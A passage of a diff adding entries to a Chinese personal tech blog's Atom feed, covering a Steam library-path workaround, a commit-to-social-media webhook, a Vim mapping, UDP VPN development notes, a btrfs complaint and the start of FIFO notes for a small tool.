+&lt;h4 id=&quot;新的解决办法&quot;&gt;新的解决办法&lt;/h4&gt;
+&lt;p&gt;随便创建个文件，只要名字不是gdb, cgdb, valgrind, strace. 内容是:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;LD_LIBRARY_PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LD_LIBRARY_PATH&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s/:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;usr&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;lib32//&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;给执行权限。&lt;/p&gt;
+
+&lt;p&gt;然后这样启动 Steam 就行了。&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;c&quot;&gt;# For example: env DEBUGGER=/usr/bin/STEAM_DEBUGGER steam&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;env &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;DEBUGGER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/path/to/script steam&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2015/01/ldconfig-and-steam-workaround/&quot;&gt;解决用 ldconfig 指定 libgl 库时 Steam 的异常&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on January 28, 2015.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[在社交平台上发布匹配一定规则的 Github commit message]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2015/01/post-github-commits-to-social-platforms/" />
+  <id>https://cubl.in/blog/2015/01/post-github-commits-to-social-platforms</id>
+  <updated>2015-01-15T00:00:00-00:00</updated>
+  <published>2015-01-15T00:00:00+00:00</published>
+  
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;p&gt;之前看到了 @fqj1994 juju 的这篇 blog: &lt;a href=&quot;https://blog.fqj.me/posts/2013/08/google-app-script-share-blog-updates-with-social-network&quot;&gt;用 Google App Script 實現博客更新時自動在社交網絡上發狀態分享&lt;/a&gt;, 也感觉自己的 blog 根本没人访问，需要一个类似的东西。因为我的 blog 是用的 jekyll, 挂在 &lt;a href=&quot;https://github.com/cubarco/cubarco.github.io&quot;&gt;Github&lt;/a&gt; 上的，Github 又提供了一个叫 Webhook 的东西，就准备自己实现一种更加&lt;s&gt;优雅&lt;/s&gt;的方式。&lt;/p&gt;
+
+&lt;p&gt;项目放在 &lt;a href=&quot;https://github.com/cubarco/post-github-commits&quot;&gt;Github&lt;/a&gt; 上，遵循 &lt;a href=&quot;http://www.gnu.org/licenses/gpl-2.0.html&quot;&gt;GPLv2&lt;/a&gt; 协议。整个流程很简单，就是接受 Webhook 发来的 json, 然后从中提取 commits message, 用一定的正则表达式取出标题，之后再发往各个社交平台。&lt;/p&gt;
+
+&lt;p&gt;昨天实现了 twitter 的部分(twitter 可以拿到不会过期的 access token)，看了下 OAuth 感觉要维护那些 token 的状态好麻烦，懒得弄… 我正在用的主要就是 twitter, Google+, 和 Facebook. Google+ 据说没给发 post 的 api, 所以作罢。接下来尽可能支持 Facebook.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;如果腳本正常的話，理論上這則文章會很快被發佈到我常用的社交網絡。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;嗯，就是这样。&lt;/p&gt;
+
+&lt;h6 id=&quot;update-2015-01-15&quot;&gt;Update 2015-01-15:&lt;/h6&gt;
+&lt;p&gt;这个 blog 发出去之后发现 log 报错了(UnicodeEncodeError)，但是没时间修了&lt;s&gt;(出去玩了)&lt;/s&gt;。晚上回来处理完各种事情之后才开始修。发现是 &lt;code class=&quot;highlighter-rouge&quot;&gt;urllib.urlencode()&lt;/code&gt; 不支持 unicode, fix 已经推到 Github 上了… 感觉 python 还是学的不好啊。其实我一开始学 python 就是随手写个后台，没准备深入。现在又发觉 python 挺好用的，但是不知道怎么深入，有心无力的感觉哎。&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2015/01/post-github-commits-to-social-platforms/&quot;&gt;在社交平台上发布匹配一定规则的 Github commit message&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on January 15, 2015.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Vim 删除成对的字符]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2015/01/vimscript-delpair/" />
+  <id>https://cubl.in/blog/2015/01/vimscript-delpair</id>
+  <published>2015-01-11T00:00:00+00:00</published>
+  <updated>2015-01-11T00:00:00+00:00</updated>
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;p&gt;今天为了偷懒又往 .vimrc 里面写了点东西，作用是在删除类似于&lt;code class=&quot;highlighter-rouge&quot;&gt;()&lt;/code&gt;这种成对出现的字符对的前一个字符时同时删除后面那个…&lt;/p&gt;
+
+&lt;p&gt;下面是具体内容:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-vim&quot; data-lang=&quot;vim&quot;&gt;inoremap &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;BS&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;=&lt;/span&gt;DelPair&lt;span class=&quot;p&quot;&gt;()&amp;lt;&lt;/span&gt;CR&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; DelPair&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; currentline &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;getline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; prechar &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; currentline&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; fochar &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; currentline&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;prechar &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'('&lt;/span&gt; &amp;amp;&amp;amp; fochar &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;')'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;se&quot;&gt;        \&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;prechar &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'['&lt;/span&gt; &amp;amp;&amp;amp; fochar &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;']'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;se&quot;&gt;        \&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;prechar &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;'&lt;/span&gt; &amp;amp;&amp;amp; fochar &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;se&quot;&gt;        \&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;prechar &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{'&lt;/span&gt; &amp;amp;&amp;amp; fochar &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;se&quot;&gt;        \&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;prechar &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&quot;'&lt;/span&gt; &amp;amp;&amp;amp; fochar &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&quot;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;se&quot;&gt;        \&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;prechar &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;'&quot;&lt;/span&gt; &amp;amp;&amp;amp; fochar &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;\&amp;lt;BS&amp;gt;\&amp;lt;Delete&amp;gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;\&amp;lt;BS&amp;gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;endf&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2015/01/vimscript-delpair/&quot;&gt;Vim 删除成对的字符&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on January 11, 2015.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[vpn-udp-libev 开发总结]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2015/01/vpn-udp-libev-development-notes/" />
+  <id>https://cubl.in/blog/2015/01/vpn-udp-libev-development-notes</id>
+  <updated>2015-01-10T00:00:00-00:00</updated>
+  <published>2015-01-09T00:00:00+00:00</published>
+  
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;p&gt;最近又在看 UNIX 网络编程那本书，写了个 vpn 练手，代码和简单的介绍在 &lt;a href=&quot;https://github.com/cubarco/network-programming-exp/tree/master/vpn-udp-libev&quot; title=&quot;cubarco/network-programming-exp/vpn-udp-libev&quot;&gt;Github&lt;/a&gt; 上&lt;s&gt;(好像效率还不错的样子)&lt;/s&gt;。这里照例做一下总结，便于以后查阅。&lt;/p&gt;
+
+&lt;h4 id=&quot;关于recvfrom&quot;&gt;关于&lt;code class=&quot;highlighter-rouge&quot;&gt;recvfrom()&lt;/code&gt;&lt;/h4&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cm&quot;&gt;/* recvfrom() 的声明 */&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;recvfrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                 &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socklen_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addrlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;这个函数比较诡异的是它的最后一个参数&lt;code class=&quot;highlighter-rouge&quot;&gt;addrlen&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;go&quot;&gt;If  src_addr  is  not  NULL, and the underlying protocol provides the source
+address of the message, that source address is placed in the buffer  pointed
+to  by  src_addr.  In this case, addrlen is a value-result argument.  Before
+the call, it should be initialized to the size of the buffer associated with
+src_addr.  Upon return, addrlen is updated to contain the actual size of the
+source address.  The returned address is truncated if the buffer provided is
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;too  small;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt;, addrlen will &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;a value greater than was sup‐
+&lt;span class=&quot;go&quot;&gt;plied to the call.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;一开始用的时候没有仔细看 manpage，天真地以为既然传的是指针，它的用处应该就只储存返回值。但是昨天跟 @hexchain juju讨论之后，发现这个函数还是会用到&lt;code class=&quot;highlighter-rouge&quot;&gt;addrlen&lt;/code&gt;的初始值的,目的大概是为了防止给&lt;code class=&quot;highlighter-rouge&quot;&gt;src_addr&lt;/code&gt;传值的时候溢出。以后用库函数还是先查清楚参数的具体用处再用吧…&lt;/p&gt;
+
+&lt;h4 id=&quot;同时兼容-ipv4-和-ipv6&quot;&gt;同时兼容 IPv4 和 IPV6&lt;/h4&gt;
+&lt;p&gt;服务器为了同时兼容两种协议，主要就是 addr 结构体的选择，&lt;code class=&quot;highlighter-rouge&quot;&gt;sockaddr_in&lt;/code&gt;是为 IPv4 准备的，在我 x64 系统上它的结构体大小是 16B，而&lt;code class=&quot;highlighter-rouge&quot;&gt;sockaddr_in6&lt;/code&gt;是为 IPv6 准备的，大小是28B，一开始我以为&lt;code class=&quot;highlighter-rouge&quot;&gt;sockaddr&lt;/code&gt;是兼容二者的结构体，但是这货大小只有16B。在&lt;a href=&quot;https://github.com/clowwindy/ShadowVPN&quot; title=&quot;ShadowVPN&quot;&gt;ShadowVPN&lt;/a&gt;代码里找了找，发现&lt;code class=&quot;highlighter-rouge&quot;&gt;sockaddr_storage&lt;/code&gt;这个结构体，据说是兼容了所有 addr 结构，包括最大的 UNIX 套接字，大小有 128B。然后具体到 IP 地址的转换，可以用&lt;code class=&quot;highlighter-rouge&quot;&gt;inet_pton()&lt;/code&gt;这个兼容两种IP协议的函数。&lt;/p&gt;
+
+&lt;h4 id=&quot;关于-mtu&quot;&gt;关于 MTU&lt;/h4&gt;
+&lt;p&gt;之前对 MTU 一直是云里雾里的，这次算是对它有了一点了解。&lt;a href=&quot;http://en.wikipedia.org/wiki/Maximum_transmission_unit&quot;&gt;MTU(Maximum transmission unit)&lt;/a&gt;指的就是通讯协议的&lt;code class=&quot;highlighter-rouge&quot;&gt;DATA&lt;/code&gt;块的最大容量。一个 link 的 MTU 决定了通过它的 IP 包的最大体积。所以设置一个 tunnel 设备的 MTU 可以确保这些 IP 包在套上另一层 UDP + IP 的 header 之后不会被超出 MTU 被 fragment.&lt;/p&gt;
+
+&lt;h4 id=&quot;关于压缩&quot;&gt;关于压缩&lt;/h4&gt;
+&lt;p&gt;最大(无损)压缩比例决定于信息熵。所以用&lt;code class=&quot;highlighter-rouge&quot;&gt;dd if=/dev/urandom bs=1M count=100 | gzip - | wc -c&lt;/code&gt;这种方式测试压缩比例的结果往往是压缩比例大于1…&lt;/p&gt;
+
+&lt;h4 id=&quot;more&quot;&gt;More&lt;/h4&gt;
+&lt;p&gt;想到再写&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2015/01/vpn-udp-libev-development-notes/&quot;&gt;vpn-udp-libev 开发总结&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on January 09, 2015.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[对 btrfs 的吐槽]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2015/01/btrfs-sucks/" />
+  <id>https://cubl.in/blog/2015/01/btrfs-sucks</id>
+  <published>2015-01-02T00:00:00+00:00</published>
+  <updated>2015-01-02T00:00:00+00:00</updated>
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;p&gt;刚把本来给&lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;/var&lt;/code&gt;用的 btrfs 换回 ext4，po 一发记(tu)录(cao)一下。&lt;/p&gt;
+
+&lt;p&gt;一开始换 btrfs 呢，是感觉这个文件系统各种功能、各种酷炫啊，比如&lt;code class=&quot;highlighter-rouge&quot;&gt;subvolume&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;snapshot&lt;/code&gt;什么的。我主要看中的其实是他的透明压缩，不仅节省硬盘空间，还能提高io的速率，这对我 5400转的 500G 硬盘还是有点作用的。不过当时年少不懂事，不知道有&lt;code class=&quot;highlighter-rouge&quot;&gt;C&lt;/code&gt;这个文件属性，直接在&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/fstab&lt;/code&gt;里用了全局压缩选项，结果导致虚拟机这种从单文件随机读取数据的场景速度慢到可怕。&lt;/p&gt;
+
+&lt;p&gt;有一个日常使用经常遇到的问题，不知道是不是和这个压缩的功能有关。跨文件系统(具体好像是&lt;code class=&quot;highlighter-rouge&quot;&gt;btrfs&amp;lt;-&amp;gt;{fat32,ntfs}&lt;/code&gt;)&lt;code class=&quot;highlighter-rouge&quot;&gt;cp&lt;/code&gt;或者&lt;code class=&quot;highlighter-rouge&quot;&gt;mv&lt;/code&gt;的时候，非常有可能会在读写进行到最后的时候 hang 住，怎么&lt;code class=&quot;highlighter-rouge&quot;&gt;kill&lt;/code&gt;都终止不了 io 进程。这个时候如果&lt;code class=&quot;highlighter-rouge&quot;&gt;ps&lt;/code&gt;看一下，会发现 io 进程陷入了&lt;code class=&quot;highlighter-rouge&quot;&gt;disk_sleep&lt;/code&gt;的状态。这时候只好直接拔 USB 储存才行。&lt;/p&gt;
+
+&lt;p&gt;还有就是大家都在说的 btrfs 会丢失文件的问题。虽然我只遇到过一次，时间是在刚换 btrfs 之后没几天，有一个目录里面的有些文件莫名其妙就不见了，我当时很肯定是没有动这个目录的文件的，所以这件事就让我对 btrfs 的印象变得不是那么好了。&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;subvolume&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;snapshot&lt;/code&gt;虽然很酷，但是平时基本也没有不会用到太多。&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;subvolume&lt;/code&gt;可以实现一个分区挂载到多个目录，这样就省去了分区的麻烦。但是硬盘里面的东西多了以后，挂载一个&lt;code class=&quot;highlighter-rouge&quot;&gt;subvolume&lt;/code&gt;的速度会变得非常慢。在我换回 ext4 之前，挂载一个&lt;code class=&quot;highlighter-rouge&quot;&gt;subvolume&lt;/code&gt;的时间平均是 5s, 一次开机就让挂载卡去了 15s, 实在是非常不划算。而且这也不是没有替代方案。比如我现在就是把&lt;code class=&quot;highlighter-rouge&quot;&gt;/var&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt;放在一个分区，开机后挂载整个分区，然后用&lt;code class=&quot;highlighter-rouge&quot;&gt;bind&lt;/code&gt;的方式挂载到根目录的具体位置上。&lt;/p&gt;
+
+&lt;p&gt;至于&lt;code class=&quot;highlighter-rouge&quot;&gt;snapshot&lt;/code&gt;，用到它的就是我每两天一次的全盘备份和 docker 了。这还确实有点用处，不过用了半年，需要用到备份的时间也就一两次，docker 有没有 btrfs 其实也没什么区别。&lt;/p&gt;
+
+&lt;p&gt;所以呢，总的来说， btrfs 的问题还是有点多，一些有意思的功能日常也起不到&lt;em&gt;必不可少&lt;/em&gt;的作用。想入 btrfs 坑的还是再观望一段时间吧，已经入 btrfs 坑的话我只能祝你好运了。&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2015/01/btrfs-sucks/&quot;&gt;对 btrfs 的吐槽&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on January 02, 2015.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Paf 开发总结]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2014/12/paf-develop-notes/" />
+  <id>https://cubl.in/blog/2014/12/paf-develop-notes</id>
+  <updated>2015-01-01T00:00:00-00:00</updated>
+  <published>2014-12-31T00:00:00+00:00</published>
+  
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/cubarco/paf&quot; title=&quot;Pipe as File Github Homepage&quot;&gt;Paf (Pipe as file)&lt;/a&gt; 并不是什么大项目，只是一时兴起为满足自己奇怪需求而开发的小工具。具体的介绍都摆在 Github 上了，这里就不赘述了。只是对开发过程中遇到的一些问题和技巧做一下总结。&lt;/p&gt;
+
+&lt;h4 id=&quot;eof-的产生&quot;&gt;EOF 的产生&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pipe&lt;/code&gt;是有一定容量的&lt;sup id=&quot;fnref:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;，这一部分就是内核维护的缓冲区。当&lt;code class=&quot;highlighter-rouge&quot;&gt;pipe&lt;/code&gt;的读端试图对文件描述符执行&lt;code class=&quot;highlighter-rouge&quot;&gt;read()&lt;/code&gt;系统调用的时候，内核会先检查缓冲区是否有数据，有则返回; 若没有，则根据读端文件描述符具体是否以阻塞标志打开，如阻塞，则阻塞至缓冲区有数据，或者当对端已经关闭文件描述符的时候，读端的&lt;code class=&quot;highlighter-rouge&quot;&gt;read()&lt;/code&gt;调用会返回0, 这就是所谓的&lt;code class=&quot;highlighter-rouge&quot;&gt;EOF&lt;/code&gt;。对&lt;code class=&quot;highlighter-rouge&quot;&gt;pipe&lt;/code&gt;的写端执行&lt;code class=&quot;highlighter-rouge&quot;&gt;close()&lt;/code&gt;并不会刷新&lt;code class=&quot;highlighter-rouge&quot;&gt;pipe&lt;/code&gt;的缓冲区，而且读端也并不能立即察觉到写端已经关闭。这引发了一个问题，也是我在开发过程中碰到的一个很大的问题。如果写端在关闭后，在&lt;code class=&quot;highlighter-rouge&quot;&gt;pipe&lt;/code&gt;的缓冲区还没被读端读取完的时候，重新打开并写入数据，这部分数据会写入原先的缓冲区并被读端继续读取。&lt;/p&gt;
+
+&lt;h4 id=&quot;fifo-的正确使用姿势&quot;&gt;FIFO 的正确使用姿势&lt;/h4&gt;
+&lt;p&gt;上文提到的&lt;code class=&quot;highlighter-rouge&quot;&gt;EOF&lt;/code&gt;并未被读端及时响应还会造成另一个问题。如果写端关闭后立即执行&lt;code class=&quot;highlighter-rouge&quot;&gt;open()&lt;/code&gt;系统调用，这个函数不会阻塞，因为读端确实正处于打开的状态。另一方面，读端关闭后立即执行也不会阻塞。这对程序的逻辑造成了致命的影响，它让读端误以为第二次打开的是一个新的文件，同时让写端误以为读端已经在请求新文件的数据。&lt;/p&gt;
+
+&lt;p&gt;所以&lt;code class=&quot;highlighter-rouge&quot;&gt;FIFO&lt;/code&gt;的正确使用姿势应该是在写端&lt;code class=&quot;highlighter-rouge&quot;&gt;open()&lt;/code&gt;之后立即&lt;code class=&quot;highlighter-rouge&quot;&gt;unlink()&lt;/code&gt;然后再&lt;code class=&quot;highlighter-rouge&quot;&gt;mkfifo()&lt;/code&gt;:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;wfd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_WRONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
